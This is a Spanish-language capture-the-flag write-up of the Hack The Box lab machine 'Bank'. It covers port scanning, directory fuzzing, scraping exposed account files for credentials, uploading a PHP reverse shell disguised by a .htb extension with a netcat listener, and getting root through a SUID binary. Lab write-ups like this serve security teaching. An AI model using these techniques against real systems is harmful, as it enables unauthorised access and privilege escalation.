---
layout: default
title: Bank
---
# Bank | Write-Up

## Enumeración inicial

Empezamos comprobando que hay conexión mediante paquetes ICMP con el comando ping.

```bash
$ ping -c 1 10.129.1.243
PING 10.129.1.243 (10.129.1.243) 56(84) bytes of data.
64 bytes from 10.129.1.243: icmp_seq=1 ttl=63 time=7.35 ms

--- 10.129.1.243 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.353/7.353/7.353/0.000 ms
```

Una vez comprobamos que tenemos conexión, procedemos a realizar un escaneo de puertos con nmap.

```bash
$ nmap 10.129.1.243
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 10:51 CDT
Nmap scan report for 10.129.1.243
Host is up (0.0090s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

Vemos 3 puertos abiertos, aunque el que más nos interesa es el 80, por el que corre un servicio http, ya que las aplicaciones web suelen ser las vias de entrada principal para los pentesters, no obsante, primero analizaremos más a fondo los puertos por si hay alguna versión vulnerable a algún CVE.

```bash
$ nmap -sCV 10.129.1.243 -p22,53,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 10:53 CDT
Nmap scan report for 10.129.1.243
Host is up (0.0075s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

No parece ser vulnerable ninguna de las versiones a priori, comprobándolo con CVEs en bases de datos públicas como ExploitDB, Rapid7, etc.

Si navegamos a la Web, podemos ver la página por defecto de Apache:

![bank]({{ "/assets/images/bank1.png"}})

No obstante, si hacemos fuerza bruta de Vhosts, es probable que no encontremos ninguno, esto se debe a que en esta máquina se usa el Vhost **bank.htb**, el cual por el nombre es predecible, esta entrada deberíamos agregarla al archivo **/etc/hosts**:

```bash
$ echo '10.129.1.243 bank.htb' | sudo tee -a /etc/hosts
```

Ahora podemos navegar al vhost **bank.htb**, el cual nos lleva a una página de login, no obstante, como no conocemos credenciales de momento, haremos fuzzing de directorios con la herramienta **ffuf**:

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://bank.htb/FUZZ -ic

<SNIP>

uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 10ms]
assets                  [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 7ms]
inc                     [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 7ms]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189, Duration: 16ms]
server-status           [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 7ms]
balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 7ms]
```

Vemos un directorio que se llama **balance-transfer**, y teniendo en cuenta que es un banco, podría estar interesante, vamos a navegar a él:

![bank]({{ "/assets/images/bank2.png"}})

Podemos ver muchísimos archivos, descargando alguno de ellos vemos el contenido tal que así:

```bash
$ cat 0a0b2b566c723fce6c5dc9544d426688.acc 
++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
CreditCards: 5
Transactions: 93
Balance: 905948 .
===UserAccount===
```

Tiene credenciales encriptadas, interesante, en la mayoría pone **++OK ENCRYPT SUCCESS**, no obstante, o bien navegando en el directorio o bien con el Intruder podemos ver el contenido de todos los archivos, o incluso descargarlos todos, en este caso, vamos a usar **Turbo Intruder**, no obstante, antes tenemos que sacar los nombres de todos los archivos y guardarlos en un fichero, usaremos el siguiente comando para ello:

```bash
$ curl http://bank.htb/balance-transfer/ | cut -d "\"" -f8 | head -n 1010 | tail -n1000 > archivos_bank.txt
```

Tras ejecutarlo, tendríamos los nombres de los 1000 archivos que se encuentran en el directorio dentro del archivo **archivos_bank.txt**, ahora sí, usemos Turbo Intruder:

![bank]({{ "/assets/images/bank3.png"}})

Tras ejecutarlo, si ordenamos por longitud de respuesta, veremos uno que ocupa bastante menos que los demás, y si vemos el contenido encontramos un mensaje **--ERR ENCRYOT FAILED** y por lo tando las credenciales desencriptadas:

![bank]({{ "/assets/images/bank4.png"}})

Una vez iniciemos sesión con esas credenciales, vemos un apartado de soporte dentro del banco, en el que podemos subir tickets, con imágenes!

Si echamos un vistazo al código fuente, vemos el siguiente comentario:

![bank]({{ "/assets/images/bank5.png"}})

Parece que si subimos archivos con extensión **.htb**, el sistema lo ejecutará como un archivo php, podemos coger un payload de **revshells.com** o bien escribirlo nosotros mismos, o incluso usar msfvenom.

Una vez elegido el payload y añadido a un archivo con extensión **.htb**, ponemos a escucha el puerto que específicamos en el payload.

```bash
$ sudo nc -lvnp 443
listening on [any] 443 ...
```

Una vez subido el archivo, hacemos click en **click here** en la columna **attachments** y se ejecutará el archivo, por lo que recibiremos una reverse shell.

![bank]({{ "/assets/images/bank6.png"}})

```bash
$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.130] from (UNKNOWN) [10.129.1.243] 35588
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 19:31:06 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1081): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/$ whoami
whoami
www-data
www-data@bank:/$ 
```

Tenemos la reverse shell bajo el usuario **www-data**, si vamos a /home/, encontramos el directorio del usuario **chris**, el cual contiene la user flag, y podemos leerla con nuestro usuario.

```bash
www-data@bank:/home/chris$ ls -l
total 4
-r--r--r-- 1 chris chris 33 Jul 15 18:48 user.txt
www-data@bank:/home/chris$ cat user.txt 
```

Para escalar privilegios, podríamos usar herramientas como **LinPeas** para enumerar el sistema, no obstante, lo haremos manual, busquemos binarios u ejecutables con el permiso SUID con el siguiente comando:

```bash
www-data@bank:/home/chris$ find / -type f -perm -4000 2>/dev/null 
/var/htb/bin/emergency
```

Hay muchos binarios que es normal que tengan el SUID, los acorté, no obstante, encontramos uno llamado **emergency** y no sabemos que hace, si navegamos a **/var/htb** encontramos una versión del binario sin compilar, podemos ver qué hace el binario:

```bash
www-data@bank:/var/htb$ ls
bin  emergency
www-data@bank:/var/htb$ cat emergency 
#!/usr/bin/python
import os, sys

def close():
	print "Bye"
	sys.exit()

def getroot():
	try:
		print "Popping up root shell..";
		os.system("/var/htb/bin/emergency")
		close()
	except:
		sys.exit()

q1 = raw_input("[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: ");

if q1 == "y" or q1 == "yes":
	getroot()
else:
	close()
```

Cómo podemos ver, es un archivo que nos pregunta literamlmente si queremos una shell como el usuario root, nos saldrá un prompt, si ponemos **y** nos dará directamente una shell como el usuario root, no obstante, podemos ejecutar el binario directamente y ni nos pregunta, obtenemos la shell como root.

```bash
www-data@bank:/var/htb$ bin/emergency 
# whoami
root
```

Ya seríamos root y habríamos acabado con la máquina Bank! La flag de root se encuentra en **/root**


# VIDEO WRITE-UP

<iframe width="100%" height="400" src="https://www.youtube.com/embed/eLu7QrAzQu0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
